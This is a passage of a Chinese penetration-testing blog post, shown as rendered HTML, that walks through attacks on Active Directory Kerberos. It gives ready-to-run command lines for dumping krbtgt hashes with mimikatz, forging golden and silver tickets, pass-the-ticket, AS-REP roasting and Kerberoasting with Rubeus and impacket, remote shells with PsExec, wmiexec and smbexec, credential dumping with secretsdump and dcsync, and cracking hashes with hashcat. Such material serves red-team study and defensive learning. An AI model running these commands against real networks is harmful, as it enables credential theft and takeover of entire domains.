+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302161700639.png" alt="image-20230216170011603" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230216170011603</span></div></div>
+
+<p>也可以使用</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;Log&quot; &quot;Privilege::Debug&quot; &quot;lsadump::lsa /inject /name:krbtgt&quot; &quot;<span class="keyword">exit</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p>来转储指定用户的哈希值</p>
+<p>然后在Mimikatz执行以下命令来创建黄金票据</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Kerberos::<span class="title">golden</span> /<span class="title">user:Administrator</span> /<span class="title">domain:controller</span>.<span class="title">local</span> /<span class="title">sid:S</span>-1-5-21-432953485-3795405108-1502158860 /<span class="title">krbtgt</span>:72<span class="title">cd714611b64cd4d5550cd2759db3f6</span> /<span class="title">ticket:ticket</span>.<span class="title">kirbi</span> [/<span class="title">id</span>:对应用户的<span class="title">rid</span>]</span></span><br></pre></td></tr></table></figure>
+
+<p>在创建完票据后，进行票据传递，从而获得伪造用户的权限</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Kerberos::<span class="title">ptt</span> <span class="title">ticket.kirbi</span></span></span><br></pre></td></tr></table></figure>
+
+<p>票据传递之后，就是在建立IPC连接后的攻击方式了，而IPC能够访问的机器取决于伪造用户的权限高低</p>
+<p><strong>psexec</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.60.1 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>WMIEXEC.VBS</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 192.168.60.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS_REP Roasting攻击"></a>AS_REP Roasting攻击</h3><p>AS_REP Roasting是一种对用户账户进行离线爆破的方式</p>
+<p>需要关闭预身份验证，而此选项又是默认开启的，所以有一定的限制</p>
+<p>默认开启的预身份验证是会记录密码错误次数来防止爆破的</p>
+<p>关闭预身份验证后，在进行AS_REQ之后的时候，KDC不会进行任何验证就将TGT和用该用户Hash加密的Login Session Key返回</p>
+<p>由于AS_REP的数据包中Login Session Key的是由用户Hash进行加密的</p>
+<p>因此，可以对获取到的用户Hash加密的Login Session Key进行离线爆破，得到对应用户的明文密码</p>
+<p>【爆破的原理就是将明文进行hash计算，然后再对Login Session Key进行解密，如果成功，则得到明文密码】</p>
+<p>AS_REP Roasting攻击的前提条件:</p>
+<ul>
+<li>域用户需要勾选“不要求Kerberos预身份验证”选项</li>
+<li>需要一台可与KDC 88端口进行通信的主机</li>
+</ul>
+<p>工具:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rebeus</a>【需要在域内主机使用】</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/MorielHarush/Red-Team-Tools/blob/main/ASREPRoast.ps1">ASREPRoast.ps1</a>【需要在域内主机使用】</li>
+<li><a target="_blank" rel="noopener" href="http://www.joeware.net/freetools/tools/adfind/index.htm">Adfind</a>和<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">impacket</a>【可以在非域内主机使用】</li>
+</ul>
+<h4 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>执行以下命令，Rebeus会自动搜素域内关闭了预身份验证的用户，并以该用户身份发起AS_REQ，并获得AS_REP，将用户Hash加密的Login Session Key转储为hashcat可以进行爆破的格式，保存为hash.txt</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /<span class="built_in">format</span>:hashcat /outfile:hash.txt</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172028437.png" alt="image-20230217202717813" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230217202717813</span></div></div>
+
+<p>然后使用hashcat进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat  -a 0 -m 18200 1.txt  rockyou.txt  -o 2.txt </span><br><span class="line"><span class="comment">#1.txt；目标hash</span></span><br><span class="line"><span class="comment">#rockyou.txt；字段</span></span><br></pre></td></tr></table></figure>
+
+<p>如果字典够牛逼，就可以获得那些关闭了预身份验证的用户的密码</p>
+<h4 id="ASREPRoast-ps1"><a href="#ASREPRoast-ps1" class="headerlink" title="ASREPRoast.ps1"></a>ASREPRoast.ps1</h4><p>原理跟Rebeus一样，要先导入ASREPRoast.ps1再执行</p>
+<p>会返回关闭了预身份验证的用户名、DN以及用户Hash加密的Login Session Key</p>
+<p>最后使用select过滤出Hash</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Invoke-ASREPRoasting | select -ExpandProperty Hash</span><br></pre></td></tr></table></figure>
+
+<h4 id="Adfind和impacket"><a href="#Adfind和impacket" class="headerlink" title="Adfind和impacket"></a>Adfind和impacket</h4><p><a target="_blank" rel="noopener" href="https://www.joeware.net/freetools/tools/adfind/usage.htm">Adfind使用帮助</a></p>
+<p>对于非域内的主机，可以使用Adfind执行以下命令过滤出关闭了预身份验证的用户</p>
+<p>需要拥有一个有效的域账户和密码</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h <span class="number">10</span>.<span class="number">10</span>.<span class="number">17</span>.<span class="number">251</span> -u Administrator -up P@$$W0rd -dn -f &quot;useraccountcontrol:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">4194304</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172120594.png" alt="image-20230217212009518" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230217212009518</span></div></div>
+
+<p>然后使用impacket的GetBPUser.py把上面过滤出的域账户写入user.txt文件，运行如下命令获取指定用户hash加密的Login Session Key，并以hashcat可以爆破的格式打印出来</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py  -dc-ip <span class="number">10</span>.<span class="number">10</span>.<span class="number">17</span>.<span class="number">251</span> -usersfile GetNPUser.txt  -<span class="built_in">format</span> hashcat controller.local/</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302172127309.png" alt="image-20230217212727241" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230217212727241</span></div></div>
+
+<p>然后用hashcat进行爆破就行</p>
+<h2 id="TGS-REP-1"><a href="#TGS-REP-1" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>Kerberoasting攻击发生在Kerberos的TGS_REP阶段，KDC的TGS返回一个由服务Hash加密的ST给客户端。</p>
+<p>由于ST是用服务的Hash进行加密的，因此客户端拿到该ST后可以用于本地离线爆破。如果字典够牛逼，那么就很有可能爆破出SPN链接用户的明文密码<br>如果该服务在域内被配置为高权限运行，那么攻击者可能接管整个域</p>
+<p>其<strong>核心</strong>在于，攻击者和KDC协商ST加密的时候，协商的是使用<strong>RC4_HMAC_MD5</strong>加密算法，而该加密算法容易被破解，因为攻击者可以在本地进行离线爆破</p>
+<p><strong>Kerberoasting的前提</strong>：服务SPN必须注册在域用户账户下，因为机器账户的密码是随机生成的，基本爆破不了</p>
+<p>攻击过程：</p>
+<ol>
+<li>攻击者提供一个正常的域用户密码进行认证，获得TGT</li>
+<li>攻击者使用该TGT请求针对指定SPN的ST</li>
+<li>KDC在验证身份后，返回服务Hash加密的ST，不管提供的域用户有没有对指定SPN服务的访问权限</li>
+<li>攻击者本地离线爆破ST，获得SPN所链接账户的明文密码</li>
+</ol>
+<p>攻击流程：</p>
+<ol>
+<li>查询域内注册于域用户的SPN</li>
+<li>请求指定SPN的ST</li>
+<li>导出请求的ST</li>
+<li>对该ST进行离线爆破</li>
+</ol>
+<h4 id="SPN的发现"><a href="#SPN的发现" class="headerlink" title="SPN的发现"></a>SPN的发现</h4><p>默认情况下，域内会有个注册在krbtgt下的SPN kadmin&#x2F;changepw，但是该SPN对于kerberoasting是没有用的，因为krbtgt的密码是随机生成的，几乎不可能爆破</p>
+<p>所以需要使用以下工具，找到其他的SPN</p>
+<p><strong>1.<a target="_blank" rel="noopener" href="https://github.com/cyberark/RiskySPN">RiskySPN</a></strong></p>
+<p>RiskySPNs 是一组 PowerShell 脚本，专注于检测和滥用与 SPN（服务主体名称）关联的帐户。该模块可以帮助蓝队识别有潜在风险的 SPN，并帮助红队利用 Kerberos 和 Active Directory 提升权限</p>
+<p><strong>可以用来查找当前域内注册在用户下的可能包含弱密码的SPN</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\RiskySPNs.psm1</span><br><span class="line"><span class="built_in">Find-PotentiallyCrackableAccounts</span><span class="comment">#查找易受攻击的</span></span><br></pre></td></tr></table></figure>
+
+<p>他还可以直接请求ST</p>
+<p><strong>为 SPN 请求 Kerberos TGS</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-TGSCipher -SPN &quot;MSSQLSvc/prodDB.company.com:1433&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher</span><br></pre></td></tr></table></figure>
+
+<p>有趣的东西:)，这个应该是获取ST里的服务HASH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format &quot;Hashcat&quot; | Out-File crack.txt</span><br><span class="line">oclHashcat64.exe -m 13100 crack.txt -a 3</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.GetUserSPNs</strong></p>
+<p>是<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">kerberoast</a>里的一个查询注册于域内用户下的SPN的脚本</p>
+<p>有vs和powershell两种，可以查询域内所以注册在用户下的SPN，包括注册于krbtgt下的kadmin&#x2F;changepw</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vbs</span></span><br><span class="line">cscript .\GetUserSPNs.vbs</span><br><span class="line"><span class="comment">#powerhshell</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">Powerview.ps1</a></strong></p>
+<p>是Powersploit中Recon目录下的powershell脚本文件</p>
+<p>可以查询域内所以注册在用户下的SPN，包括krbtgt用户，并返回详细信息</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Muole</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-SPN</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="请求服务票据（ST）"><a href="#请求服务票据（ST）" class="headerlink" title="请求服务票据（ST）"></a>请求服务票据（ST）</h4><p><strong>1.Impacket请求</strong></p>
+<p><code>GeyUserSPNs.py</code>可以用来请求注册于用户下的所有SPN的服务票据，也可以请求注册于指定用户下的SPN的服务器票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求注册于用户下的所有SPN服务票据，并保存为hashcat可以破解的格式</span></span><br><span class="line">python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:password -outputfile hash.txt</span><br><span class="line"><span class="comment">#请求指定用户hack下的SPN服务票据，并保存为hashcat可以破解的格式</span></span><br><span class="line">python3 GetUserSPNs.py -request -dc-ip 10.211.55.4 xie.com/hack:password -outputfile hash.txt -request-user hack</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.Rebeus请求</strong></p>
+<p>Rebeus支持对所有用户或特定用户执行Kerberoasting操作，原理是先用LDAP查询域内所有注册在域用户下的SPN（除了kadmin&#x2F;changpw），再通过发送TGS包，直接输出能使用John或hashcat爆破的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#请求注册于用户下的所有SPN服务票据，并保存为hashcat可以破解的格式</span></span><br><span class="line">Rebeus.exe kerberoast /format:hashcat /outfile:hash.txt</span><br><span class="line"><span class="comment">#请求指定用户下的指定SPN服务票据，并保存为john可以破解的格式</span></span><br><span class="line">Rebeus.exe kerberoast /spn:SQLSERVER/win7.xie.com:1443/MSSQL  /format:john /outfile:hash.tx</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.mimikatz请求</strong></p>
+<p>请求指定SPN的服务票据，请求的ST将保存在内存中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ask /target:SQLSERVER/win7.xie.com:1443/MSSQL</span><br></pre></td></tr></table></figure>
+
+<h4 id="导出内存中的服务票据"><a href="#导出内存中的服务票据" class="headerlink" title="导出内存中的服务票据"></a>导出内存中的服务票据</h4><p>因为有的工具请求的票据是保存在内存中的，所以需要将其导出，才能进行爆破</p>
+<p><strong>1.查看内存中的票据</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cmd命令行</span></span><br><span class="line">klist</span><br><span class="line"><span class="comment">#mimikatz里</span></span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.使用mimikatz导出票据</strong></p>
+<p>得到.kirbi格式的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::list /export&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3.使用Empire导出票据</strong></p>
+<p>Empire下的<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1"><strong>Invoke-Kerberoast.ps1</strong></a>可以导出内存中的票据，并以hashcat或者john的格式保存</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1</span><br><span class="line">Invoke-Kerberoast -outputFormat hashcat</span><br></pre></td></tr></table></figure>
+
+<h4 id="离线爆破票据"><a href="#离线爆破票据" class="headerlink" title="离线爆破票据"></a>离线爆破票据</h4><p><strong>1.kerberoast</strong></p>
+<p>Kerberoast下的<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py">tgsrepcrack.py</a>，可以离线爆破.kirbi格式的票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py pass.txt &lt;xxx.kribi&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.<a target="_blank" rel="noopener" href="https://github.com/leechristensen/tgscrack">tgscrack</a></strong></p>
+<p>先将.kribi格式的文件转换成这个工具可爆破的格式，再使用这个go脚本进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 extractServiceTicketParts.py xxxx.kribi &gt; hash.txt</span><br><span class="line">go run tgscrack.go -hashfile hash.txt -wordlist pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.hashcat</strong></p>
+<p>针对Rebeus和Impacket请求的票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 hash.txt pass.txt --force -o </span><br></pre></td></tr></table></figure>
+
+<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><blockquote>
+<p>在TGS_REP阶段返回的ST中的authorization-data是使用服务密钥加密的，而authorization-data里存放着代表用户的PAC，并且这个阶段的PAC的PAC_SERVER_CHECKSUM签名的密钥也是服务密钥（该阶段PAC的PAC_PRIVSVR_CHECKSUM签名的密钥是krbtgt密钥，此时客户端不能伪造PAC_SERVER_CHECKSUM签名）。但是由于 PAC_SERVER_CHECKSUM签名是可选的且默认不开启，所以可以在不伪造PAC_SERVER_CHECKSUM签名的情况下进行攻击</p>
+</blockquote>
+<p>就是在PAC没有配置PAC_SERVER_CHECKSUM签名的时候，只要获得指定服务的密钥，就能伪造高权限的用户来使用这个ST，以高权限的身份访问指定服务</p>
+<p>创建白银票据的条件：</p>
+<ul>
+<li>目标服务的密钥</li>
+<li>域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot] </li>
+<li>域的SID值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value] </li>
+<li>要伪造的用户，比如域管理员</li>
+</ul>
+<p>和黄金票据不同的是，白银票据只能<strong>访问指定服务</strong>，且白银票据的生成不与KDC进行通信，所以不会在KDC上留下日志，只会在目标服务器上留下日志。而黄金票据会在KDC上留下日志</p>
+<p><strong>使用impacket进行攻击</strong></p>
+<p>使用Impacket下的ticketer.py脚本来离线生成白银票据，然后将票据导入，即可以使用secretsdump.py、smbexec.py进行利用</p>
+<p>需要在hosts文件里添加服务对应的ip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成白银票据</span></span><br><span class="line">python3 ticketer.py -domian-sid &lt;sid&gt; -nthash &lt;server-hash&gt; -spn &lt;server-name&gt; -domain &lt;domain-name&gt; &lt;user&gt;</span><br><span class="line"><span class="comment">#导入票据</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;user&gt;.ccache</span><br><span class="line"><span class="comment">#远程连接服务所在的主机，如果是域控上的服务，就可以直接连接域控了</span></span><br><span class="line">python3 smbexec.py -no-pass -k &lt;user&gt;@&lt;domain&gt; -dc-ip &lt;dcip&gt;</span><br><span class="line"><span class="comment">#如果是域控的服务，可以导出指定用户的hash</span></span><br><span class="line">python3 secretsdump.py -k -no-pass &lt;user&gt;@&lt;domain&gt; -dc-ip &lt;dcip&gt; -just-dc-user &lt;target-user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用mimikatz进行攻击</strong></p>
+<p>使用mimikatz进行攻击的时候，利用的机器可以是域内的普通机器，也可以不是域内的机器</p>
+<p>当利用的机器不在域中时，需要将DNS服务器设置为域控</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="comment">#生成白银票据并导入当前内存</span></span><br><span class="line">Kerberos::golden /user:Administrator /domain:controller.local /sid:&lt;domain-sid&gt; /target:&lt;目标计算机名&gt; /service:&lt;要访问的服务&gt; /rc4:&lt;目标计算机的NTLM <span class="built_in">hash</span>值&gt; /user:&lt;user&gt; /ptt</span><br><span class="line"><span class="comment"># 验证是否成功，导出用户krbtgt的hash(如果目标服务是域控上的服务)</span></span><br><span class="line">lsadump:dcsync /domain:xie.com /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用cs进行攻击</strong></p>
+<p>不做赘述，他自带有图形化操作界面</p>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%953/">用户凭据收集</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/">春秋云镜Certify-wp</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
